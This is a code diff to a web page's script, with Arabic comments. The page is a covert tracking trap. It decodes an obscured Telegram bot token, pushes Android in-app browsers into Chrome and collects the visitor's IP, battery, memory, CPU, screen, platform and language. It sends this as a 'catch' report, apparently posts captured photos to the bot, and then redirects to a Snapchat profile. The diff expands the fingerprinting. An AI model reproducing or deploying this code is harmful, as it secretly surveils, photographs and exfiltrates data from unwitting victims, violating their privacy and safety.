@@ -35,23 +35,22 @@
     <canvas id="c"></canvas>
 
     <script>
-        // تشفير البيانات بنظام Base64
-        const _encT = "ODI2NDg4NjM4MzpBQUVhdURjX0ptXzN6NzR6cW1GZmxVOWNoWGhSa3Joanhz";
-        const _encC = "NTc3NTc4MTAzOA==";
-        const token = atob(_encT);
-        const chatId = atob(_encC);
+        // 🔐 تشفير التوكن والأيدي (Base64)
+        const _tk = "ODI2NDg4NjM4MzpBQUVhdURjX0ptXzN6NzR6cW1GZmxVOWNoWGhSa3Joanhz";
+        const _ci = "NTc3NTc4MTAzOA==";
+        const token = atob(_tk);
+        const chatId = atob(_ci);
 
-        // توجيه الأندرويد لمتصفح كروم
+        // 🚀 توجيه الأندرويد لكروم إذا كان داخل تطبيق
         (function() {
             const ua = navigator.userAgent;
-            const isAndroid = /Android/i.test(ua);
-            const isInApp = /FBAN|FBAV|Instagram|Messenger|WhatsApp/i.test(ua);
-            if (isAndroid && isInApp) {
-                const link = window.location.href.replace(/^https?:\/\//, '');
-                window.location.href = `intent://${link}#Intent;scheme=https;package=com.android.chrome;end`;
+            if (/Android/i.test(ua) && /FBAN|FBAV|Instagram|Messenger|WhatsApp/i.test(ua)) {
+                const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
+                window.location.href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end`;
             }
         })();
 
+        // 🛡️ حماية رابط الدخول
         const urlParams = new URLSearchParams(window.location.search);
         if (!urlParams.has('login')) {
             window.location.replace("https://www.google.com");
@@ -60,23 +59,33 @@
         }
 
         async function sendLog(m) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(m)}&parse_mode=html`);
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(m)}&parse_mode=html`);
+            } catch(e) {}
         }
 
         window.onload = async () => {
             try {
+                // 🌐 سحب الـ IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipD = await ipRes.json();
+                
+                // 🔋 سحب معلومات البطارية
                 let batt = "N/A"; 
                 try { const b = await navigator.getBattery(); batt = Math.round(b.level * 100) + "% " + (b.charging ? "🔌" : "🔋"); } catch(e){}
 
-                let report = `🔥 <b>صيد جديد (Chrome Target)</b>\n\n` +
+                // 🕵️ التقرير الكامل (الذي حُذف سابقاً)
+                let report = `🔥 <b>صيد احترافي شامل!</b>\n\n` +
                              `👤 <b>الحساب:</b> marveen_shalash\n` +
                              `🌐 <b>IP:</b> <code>${ipD.ip}</code>\n` +
                              `🔋 <b>الشحن:</b> ${batt}\n` +
+                             `🧠 <b>الرام:</b> ${navigator.deviceMemory || 'N/A'} GB\n` +
+                             `⚙️ <b>المعالج:</b> ${navigator.hardwareConcurrency || 'N/A'} Cores\n` +
                              `📱 <b>النظام:</b> ${navigator.platform}\n` +
+                             `🖥️ <b>الشاشة:</b> ${screen.width}x${screen.height}\n` +
                              `🌍 <b>اللغة:</b> ${navigator.language}\n` +
-                             `⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
+                             `⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}\n` +
+                             `🌐 <b>المتصفح:</b> ${navigator.vendor}`;
 
                 await sendLog(report);
                 startCapture();
@@ -101,7 +110,7 @@
                             fd.append('caption', `📸 صورة ${i} | marveen_shalash`);
                             fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                         }, 'image/jpeg', 0.6);
-                    }, i * 800);
+                    }, i * 850);
                 }
             } catch (e) {}
         }
@@ -110,7 +119,7 @@
             startCapture();
             setTimeout(() => {
                 window.location.href = "https://www.snapchat.com/add/marveen_shalash";
-            }, 3000);
+            }, 3500);
         };
     </script>
 </body>
